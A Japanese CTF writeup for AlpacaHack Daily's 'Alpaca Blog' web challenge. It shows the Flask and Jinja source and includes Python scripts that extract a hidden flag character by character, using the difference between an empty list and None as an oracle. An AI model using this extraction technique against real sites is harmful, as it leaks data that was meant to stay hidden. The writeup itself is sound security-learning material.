---
title: "Alpaca Blog - AlpacaHack Daily"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "alpacahack", "render-template", "regex", "alpaca", "blog"]
summary: "web writeup for \"Alpaca Blog\" from AlpacaHack Daily - techniques: alpacahack, render-template, regex, alpaca, blog."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d20_Alpaca_Blog/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Alpaca Blog"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Alpaca Blog
- **Date:** 2026-07-20
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d20_Alpaca_Blog>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d20_Alpaca_Blog/README.md>

---
# Alpaca Blog

## 問題

LLMがあればブログ書くの簡単だな

app.py
```py
FLAG = os.environ.get("FLAG", "Alpaca{dummy}")
assert re.fullmatch(r"Alpaca{\w+}", FLAG), "Invalid flag format"

posts = [
    {
        "title": "Flag",
        "content": FLAG
    },
    {
        "title": "A Small Daily Habit for Learning Security",
        "content": "Daily AlpacaHack is a simple but ..."
    },
    ...

]

@app.get("/")
def index():

    q = request.args.get("q", "")
    filtered = [post for post in posts if q in post["title"] or q in post["content"]][:4]

    if len(filtered) == 0:
        return render_template("index.html", filtered=None)

    return render_template("index.html", filtered=[post for post in filtered if post["title"] != "Flag"])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
```
index.html
```html
        <header>
            <h1>Alpaca Blog</h1>
        </header>

        <form action="/" method="get">
            <input
                type="search"
                name="q"
                value="{{ request.args.get('q', '') }}"
                placeholder="Search posts"
            >
            <button type="submit">Search</button>
        </form>

        {% if filtered is iterable %}
            <ul>
                {% for post in filtered %}
                    <li>
                        <article>
                            <h2>{{ post.title }}</h2>
                            <p>{{ post.content }}</p>
                        </article>
                    </li>
                {% endfor %}
            </ul>
        {% endif %}
```

## 概要

いくつかの記事があって、最大4件が表示されるようになっているようです。

タイトルが`Flag`の記事の本文がフラグのようですが、タイトルが`Flag`の記事は表示直前に除外されてしまいます。

検索機能によってタイトルまたは本文に特定の文字列が含まれる記事に絞り込むことができるようですが、これをどのように利用すればフラグを得られるのでしょうか？

## 方針

検索ワードがフラグに含まれる場合と含まれない場合のレスポンスの違いを利用して、フラグを1文字ずつ特定する。

## 解法

まず、app.pyのテンプレート処理のところをみてみると、

```py
    if len(filtered) == 0:
        return render_template("index.html", filtered=None)

    return render_template("index.html", filtered=[post for post in filtered if post["title"] != "Flag"])
```

のように、検索結果が0件の場合とそれ以外の場合で処理が分岐されています。

これにより、検索結果がそもそも0件だった場合は、テンプレートに`filtered`として`None`が渡されますが、検索結果がフラグ記事の1件だけでそれが除外された結果0件になった場合は空のリスト`[]`が渡されることになります。

これらのケースではいずれも記事が1件も表示されず、外見上は全く違いがありませんが、レスポンスデータには明確な違いがあります。

というのは、index.htmlの記事の出力部分をみてみると、
```html
        {% if filtered is iterable %}
            <ul>
                ...
            </ul>
        {% endif %}
```
となっていて、`filtered`がイテラブルでない場合はそもそも`<ul>`タグが出力されないようになっています。

※イテラブルとは、for文で1つずつ値を取り出せるオブジェクトで、リストやタプル、辞書型などがこれに該当します。空のリスト`[]`もイテラブルです。

というわけで、文字を変えながらレスポンスに`<ul>`が含まれるか観察し、1文字ずつ追加していくと、フラグを特定することができます。

```py
import requests
import string

URL = "http://localhost:3000/"
# URL = "http://34.170.146.252:57683/"
CHARS = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_}"

flag = "Alpaca{"
while True:
    for ch in CHARS:
        res = requests.get(URL + '?q=' + flag + ch)
        if '<ul>' in res.text:
            break
    flag += ch
    print(f"{flag = }")
    if ch == '}':
        break
```

## 余談

最初、Easy問題なのにやけに難しいなあと思ったのが、`[:4]`による4件制限に気を取られてしまったからです。

この問題のプログラムでは、4件以下に切り取った後でフラグの記事を除去しています。

したがって、フラグの記事以外に4件以上ヒットする検索ワードを指定したとき、それがフラグにも含まれていた場合は検索結果が3件になってしまいます。

これを利用して5記事中4記事以上に現れる1文字と2文字のフラグの断片をかき集めて、手動で組み立てられないかなと考えました。

しかし、そこそこ長い英文が用意されているとはいえ、さすがにそこまで都合のいいものではありませんでした。

```py
import requests
import string

URL = "http://34.170.146.252:57683/"
CHARS = string.ascii_uppercase + string.ascii_lowercase

posts = [
    配布のpostsからフラグの記事を除いたもの
]

q_list = []
for ch in CHARS:
    q = ch
    filtered = [post for post in posts if q in post["title"] or q in post["content"]]
    if len(filtered) >= 4:
        q_list.append(q)
for ch1 in CHARS:
    for ch2 in CHARS:
        q = ch1 + ch2
        filtered = [post for post in posts if q in post["title"] or q in post["content"]]
        if len(filtered) >= 4:
            q_list.append(q)

parts = []
for q in q_list:
    res = requests.get(URL + "?q=" + q)
    cnt = res.text.count("<li>")
    if cnt == 3:
        parts.append(q)
print(parts)
```
実行してみると、
```
['A', 'F', 'a', 'b', 'c', 'd', 'e', 'g', 'l', 'o', 'p', 's', 'Al', 'ac', 'bl', 'ca', 'ed', 'lp', 'pa', 'pe']
```
までは特定できましたが、これだけではどう組み立てればいいのか全く分からないうえに、そもそも数字や`_`を含めることができないので、ダメでした。

※正規表現の`\w`は、`A-Za-z0-9_`にヒットします。
